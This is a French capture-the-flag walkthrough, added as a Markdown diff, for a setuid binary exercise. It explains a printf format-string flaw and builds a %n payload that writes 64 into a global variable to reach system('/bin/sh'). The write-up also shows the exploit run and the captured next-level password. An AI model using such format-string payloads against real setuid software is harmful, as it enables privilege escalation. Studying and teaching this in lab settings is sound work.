@@ -1,0 +1,126 @@
+# Level 3
+## Résumé
+Contrôle chaine de format `printf` => `%n` => inscrire `64` dans `m` => appel à `system(bin/sh)`.
+## Préambule
+```sh
+$> ls -l
+total 8
+-rwsr-s---+ 1 level4 users 5366 Mar  6  2016 level3
+$> file level3
+level3: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x09ffd82ec8efa9293ab01a8bfde6a148d3e86131, not stripped
+```
+Le home contient un binaire appartenant à l'user `level3` et avec un `suid`. On doit donc exploiter ce binaire pour pouvoir accéder au fichier `/home/user/level4/.pass`.
+
+On récupère le fichier `level3` sur la VM pour le désassembler avec `radare2` :
+```sh
+$> scp -P 4242 level3@10.11.200.192:/home/user/level3/level3 .
+$> r2 level3
+```
+![level3_disassembled](Ressources/level3_disassembled.png)
+
+## Analyse
+### Analyse du programme
+La fonction `main` appel la fonction `v` (`0x08048520`).
+
+La fonction `v` met en place un buffer de caractère d'une taille de `520 octets` (`; var char *format @ ebp-0x208`).  
+Il est utilisé par `fgets` pour lire depuis l'entrée standard une chaine de caractères de maximum `512 octets` (`mov dword [size], 0x200`).
+Cette chaine de caractères est ensuite passée à `printf` en chaîne de format.  
+Ceci est une grave faille de sécurité car l'utilisateur peut initier les conversions qu'il souhaite pour lire ou écrire en mémoire (voir `man 3 printf`).  
+Si la variable globale `m` a pour valeur `64` (`cmp eax, 0x40`), un appel à `system` `/bin/sh` est effectué (`0x08048513`), se qui permet d'avoir accès à un shell avec `euid=level4`.  
+La valeur initiale de `m` est `0` lorsqu'on regarde sa valeur en mémoire (`0x0804988c`) avec `radare2` et aucune instruction du programme ne la modifie. On doit donc la modifier manuellement grâce à la faille de sécurité évoquée plus haut.
+### Analyse de la faille
+`%n` est une conversion de `printf` permettant de stocker le nombre de caractères écrits dans un pointeur donné en argument à la fonction.
+Un appel de `printf` tel que :
+```c
+void foo( ... ){
+ //...
+ printf("Format this: %d! And this: %s! And this too: %x", i, str, j);
+ //...
+}
+```
+génère ceci dans la stack :
+```
+   ... 
+            |-----------|
+          / |  ret addr |
+         /  |-----------|
+        /   |   sbp     |  (foo's return addres)
+       |    |-----------|
+       |    |  foo      |
+ foo  -|    |  local    |
+stack  |    |  variables| 
+rrame  |    |-----------|
+       |  / |    j      |
+       | /  |-----------|
+       |/   |    str    |
+       /\   |-----------|
+      |  \  |     i     |
+      |   \ |-----------|
+      |    \| fmt_str   +--> "Format this: %d! ..."
+printf|     |-----------|
+stack-|     | ret addr  |  (printf's return addres)
+frame |     |-----------|
+      |     |    sbp    | <- ebp
+       \    |-----------|
+        \   |  printf   |
+         \  |  local    |
+          \ |  variables| <- esp
+            '-----------'
+source : https://www.usna.edu/Users/cs/aviv/classes/si485h/s17/units/06/unit.html
+```
+Les arguments de `printf` sont donc stockés dans des valeurs plus hautes en mémoire. Vu que dans la fonction `v`, `printf` est appelé sans argument, nous nous retrouvons dans ce cas de figure :
+```
+  ... 
+            |-----------|
+           /|  ret addr |
+          / |-----------|
+         /  |   sbp     |  (foo's return addres)
+        |   |-----------|
+        |   |  foo      |
+ foo   -|  /|  local    |
+stack    \/ |  variables| 
+rrame    /\ |-----------|
+        /  \| fmt_str   +--> "Format this: %d! ..."
+printf /    |-----------|
+stack-|     | ret addr  |  (printf's return addres)
+frame |     |-----------|
+      |     |    sbp    | <- ebp
+       \    |-----------|
+        \   |  printf   |
+         \  |  local    |
+          \ |  variables| <- esp
+            '-----------'
+```
+Avec un format de chaîne de ce type donné à `printf` :
+```c
+void foo( ... ){
+ //...
+ printf("Format this: %d! And this: %s! And this too: %x"); //<--- 
+ //...
+}
+```
+les arguments recherchés par `printf` pointeront sur l'adresse de `esp` de la fonction appelante, soit `fmt_str` dans le schéma, et se déplaceront vers le bas de la stack (vers les adresses hautes). On peut ainsi accéder n'importe quelle valeur de la stack on remontant de proche en proche.  
+
+Dans notre cas, le buffer se trouve à `esp+0x10`, il faut donc remonter de 16 bytes (ou 4 int) :
+```sh
+python -c 'print("%x%x%x%n\n")';
+```
+
+La conversion `%n` pointe donc au début du buffer (`fmt_str` du schéma). En mettant l'adresse de `m` au debut de celui-ci, nous pouvons écrire la valeur désirée :
+```sh
+python -c 'print("\x8c\x98\x04\x08"+"%x%x%x%n\n")';
+```
+Enfin, il faut qu'il y a 64 caractères au total pour que la valeur inscrite dans `m` soit correcte.  
+Nous fixons la taille des conversions à 8 caractères, et nous ajoutons la différence avec des 'A' (le choix n'a pas d'importance) :
+```sh
+python -c 'print("\x8c\x98\x04\x08"+"A"*36+"%.8x%.8x%.8x%n\n")';
+```
+
+## Application
+```sh
+$> (python -c 'print("\x8c\x98\x04\x08"+"A"*36+"%.8x%.8x%.8x%n\n")'; cat -) | ./level3
+�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA00000200b7fd1ac0b7ff37d0
+Wait what?!
+cat /home/user/level4/.pass
+b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
+```
